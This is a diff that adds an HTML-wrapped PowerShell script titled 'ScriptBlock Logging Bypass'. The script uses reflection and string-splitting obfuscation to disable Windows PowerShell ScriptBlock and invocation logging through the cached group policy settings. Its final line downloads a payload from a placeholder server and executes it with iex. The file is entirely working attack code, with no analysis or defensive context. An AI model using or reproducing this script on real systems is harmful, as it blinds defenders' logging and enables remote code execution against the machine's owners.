@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Script.ps1</title>
+</head><body># ScriptBlock Logging Bypass<br/>
+# @cobbr_io<br/>
+<br/>
+$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')<br/>
+If ($GroupPolicyField) {<br/>
+&nbsp; &nbsp; $GroupPolicyCache = $GroupPolicyField.GetValue($null)<br/>
+&nbsp; &nbsp; If ($GroupPolicyCache['ScriptB'+'lockLogging']) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()<br/>
+&nbsp; &nbsp; $val.Add('EnableScriptB'+'lockLogging', 0)<br/>
+&nbsp; &nbsp; $val.Add('EnableScriptB'+'lockInvocationLogging', 0)<br/>
+&nbsp; &nbsp; $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val<br/>
+}<br/>
+iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")</body></html>
